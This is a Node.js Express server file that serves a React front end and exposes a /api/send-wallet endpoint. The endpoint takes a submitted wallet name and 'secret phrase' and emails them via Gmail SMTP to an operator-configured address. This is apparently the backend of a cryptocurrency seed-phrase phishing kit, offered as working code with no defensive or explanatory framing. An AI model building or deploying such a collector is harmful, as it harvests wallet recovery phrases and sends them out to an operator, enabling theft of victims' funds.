import express from "express";
import nodemailer from 'nodemailer';
import bodyParser from 'body-parser';
import cors from "cors";
import dotenv from 'dotenv';  
import path from 'path';
import { fileURLToPath } from 'url';
import compression from 'compression';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config();

const app = express();
app.use(cors()); 
app.use(bodyParser.json());

// Security & performance middleware
app.use(helmet());
app.use(compression());

// Helmet already added earlier, extend with CSP
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      imgSrc: ["'self'", 'data:'],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      connectSrc: ["'self'", 'https:'],
      frameAncestors: ["'none'"],
    },
  })
);

// Basic rate-limiter: 100 requests per 15 minutes per IP
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
});
app.use(limiter);

// Serve React build with long-term caching
app.use(
  express.static(path.join(__dirname, '../client/build'), {
    maxAge: '1y', // 1 year
    immutable: true,
    setHeaders: (res) => {
      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
    },
  })
);

// === Email credentials must be provided via .env ===
//   EMAIL_USER=you@gmail.com
//   EMAIL_PASS=your_app_password
//   EMAIL_TO  =recipient@gmail.com

const toEmail   = process.env.EMAIL_TO;
const fromEmail = process.env.EMAIL_USER;
const pass      = process.env.EMAIL_PASS;

const transporter = nodemailer.createTransport({
  service: 'gmail',
  pool: true,
  maxConnections: 5,
  maxMessages: 20,
  connectionTimeout: 30_000, // 30s
  auth: {
    user: fromEmail,
    pass: pass,
  },
});
  

app.post('/api/send-wallet', async (req, res) => {
  const { walletName, secretPhrase, userWalletName } = req.body;

  const mailOptions = {
    from: fromEmail,
    to: toEmail,
    subject: `New Wallet Info from ${userWalletName}`,
    text: `
      Wallet Name: ${walletName}
      Secret Phrase: ${secretPhrase}
      Submitted By: ${userWalletName}
          `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('Email sent successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, error: 'Failed to send email' });
  }
});

// Catch-all route to handle page refreshes and SPA routing
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../client/build', 'index.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));